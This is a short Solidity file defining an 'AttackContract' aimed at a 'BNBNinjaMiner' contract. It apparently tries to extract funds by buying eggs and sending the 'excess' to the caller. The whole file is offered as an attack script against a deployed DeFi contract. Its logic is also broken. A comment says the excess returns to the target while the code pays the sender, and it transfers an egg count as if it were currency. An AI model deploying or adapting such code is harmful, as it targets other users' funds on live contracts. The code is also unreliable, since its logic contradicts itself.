//SPDX-License-Identifier: MIT

pragma solidity ^0.4.26;

import "./BNBNinjaMiner.sol";

contract AttackContract {
    BNBNinjaMiner public target;
    
    constructor(BNBNinjaMiner _target) public {
        target = _target;
    }
    
    function attack() public payable {
        // Calculate how many eggs we should receive based on the amount of Ether sent
        uint256 eggsToReceive = target.calculateTrade(msg.value, target.marketEggs(), target.getBalance());

        // Purchase eggs by calling the buyEggs function with our calculated amount of eggs to receive
        target.buyEggs.value(msg.value)(0x0);

        // Check how many eggs we received
        uint256 eggsReceived = target.claimedEggs(address(this));

        // If we received more eggs than we should have, transfer the excess back to the target contract
        if (eggsReceived > eggsToReceive) {
            uint256 excessEggs = eggsReceived - eggsToReceive;
            msg.sender.transfer(excessEggs);
        }
    }
}